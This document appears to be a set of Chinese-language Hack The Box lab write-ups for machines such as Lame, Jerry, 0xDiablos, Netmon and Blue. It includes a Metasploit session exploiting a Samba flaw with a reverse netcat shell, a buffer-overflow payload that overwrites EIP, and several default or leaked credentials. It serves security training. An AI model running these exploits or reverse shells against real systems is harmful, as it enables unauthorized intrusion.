## 1. Lame

这里使用 `CVE-2007-2447` 即可完成

```bash
msf6 > use exploit/multi/samba/usermap_script 
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) > show options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasp
                                      loit
   RPORT   139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.31.100   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(multi/samba/usermap_script) > set LHOST 10.10.14.2
LHOST => 10.10.14.2
msf6 exploit(multi/samba/usermap_script) > set rhosts 10.10.10.3
rhosts => 10.10.10.3
msf6 exploit(multi/samba/usermap_script) > run 

```

## 2. Find The Easy Pass


搜索关键字，然后找到调用函数即可看得到密码

### IDA

```c
__writefsdword(0, (unsigned int)v6);
System::__linkproc__ LStrLAsg(&v16, &str_f[1]);
System::__linkproc__ LStrLAsg(&v15, &str_o[1]);
System::__linkproc__ LStrLAsg(&v14, &str_r[1]);
System::__linkproc__ LStrLAsg(&v13, &str_t[1]);
System::__linkproc__ LStrLAsg(&v12, &str_r[1]);
System::__linkproc__ LStrLAsg(&v11, &str_a[1]);
System::__linkproc__ LStrLAsg(&v10, &str_n[1]);
System::__linkproc__ LStrLAsg(&v9, &str___13[1]);
System::__linkproc__ LStrCatN(&v17, 8, v2, v15, v14, v13, v12, v11, v10, v9);
Controls::TControl::GetText(*(Controls::TControl **)(a1 + 760));
System::__linkproc__ LStrCmp(v8, v17);
if ( v4 )
    Dialogs::ShowMessage((Dialogs *)&str_Good_Job__Congr[1], v3);
else
    Dialogs::ShowMessage((Dialogs *)&str_Wrong_Password_[1], v3);
```

### x64dbg

```
00454110 | 8D45 FC                  | lea eax,dword ptr ss:[ebp-4]            | [ebp-4]:"fortran!"
00454113 | BA 08000000              | mov edx,8                               |
00454118 | E8 7F04FBFF              | call easypass.40459C                    |
0045411D | 8D55 D8                  | lea edx,dword ptr ss:[ebp-28]           | [ebp-28]:"123123"
00454120 | 8B83 F8020000            | mov eax,dword ptr ds:[ebx+2F8]          |
00454126 | E8 E5EFFDFF              | call easypass.433110                    |
0045412B | 8B45 D8                  | mov eax,dword ptr ss:[ebp-28]           | [ebp-28]:"123123"
0045412E | 8B55 FC                  | mov edx,dword ptr ss:[ebp-4]            | [ebp-4]:"fortran!"
00454131 | E8 F204FBFF              | call easypass.404628                    |
00454136 | 75 0C                    | jne easypass.454144                     |
00454138 | B8 DC414500              | mov eax,easypass.4541DC                 | 4541DC:"Good Job. Congratulations"
0045413D | E8 EE38FDFF              | call easypass.427A30                    |
00454142 | EB 0A                    | jmp easypass.45414E                     |
00454144 | B8 00424500              | mov eax,easypass.454200                 | 454200:"Wrong Password!"
00454149 | E8 E238FDFF              | call easypass.427A30                    |
0045414E | 33C0                     | xor eax,eax                             |
```

## 3. Weak RSA

使用`RsaCtfTool`这个工具可以算出弱密码的私钥

获得私钥

```bash
python3 RsaCtfTool.py --publickey key.pub --private
```

解密文件

```bash
python3 RsaCtfTool.py --key key.priv --uncipherfile flag.enc

openssl rsautl -in flag.enc -out flag.txt -decrypt -inkey key.priv
```

## 4. Jerry

使用弱口令`admin:s3cret`登入`tomcat`，部署`war`包，然后在`administrator`的桌面`flags`文件夹下可以找到`flag`

## 5. You know 0xDiablos

一个缓冲区溢出的漏洞
```c
int vuln()
{
  char s[180]; // [esp+0h] [ebp-B8h] BYREF

  gets(s);
  return puts(s);
}

char *__cdecl flag(int a1, int a2)
{
  char *result; // eax
  char s[64]; // [esp+Ch] [ebp-4Ch] BYREF
  FILE *stream; // [esp+4Ch] [ebp-Ch]

  stream = fopen("flag.txt", "r");
  if ( !stream )
  {
    puts("Hurry up and try in on server side.");
    exit(0);
  }
  result = fgets(s, 64, stream);
  if ( a1 == -559038737 && a2 == -1059139571 )
    result = (char *)printf(s);
  return result;
}
```

```
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x8048000)
RWX:      Has RWX segments
```

整体思路，覆盖`EIP`，返回到`flag`函数，并提供两个参数，值分别为`0DEADBEEFh`,`0C0DED00Dh`

使用`pwntools`进行开发

```c
payload = 'A' * 188
payload += p32(0x080491E2)  # overwrite eip
payload += p32(0x12345678)  # fix eip
payload += p32(0xDEADBEEF)
payload += p32(0xC0DED00D)
```

## 6. Netmon

使用 `ftp` 匿名登录服务器，在`users->public` 目录下得到` user.txt`

接着查找PRTG的密码存储方式

[https://kb.paessler.com/en/topic/62202-where-are-stored-passwords-saved](https://kb.paessler.com/en/topic/62202-where-are-stored-passwords-saved)

[https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data](https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data)

并且找到配置文件路径

```
<dbpassword>
<!-- User: prtgadmin -->
PrTg@dmin2018
</dbpassword>
```

但是密码不正确，试着改成`2019`即可

然后是过期版本，可以使用 `CVE-2018-9276` 即可得到管理员权限

## 7. Under Construction

[Under Construction](/HTB/Web/Under_Construction.md)

## 8. Blue

永恒之蓝的利用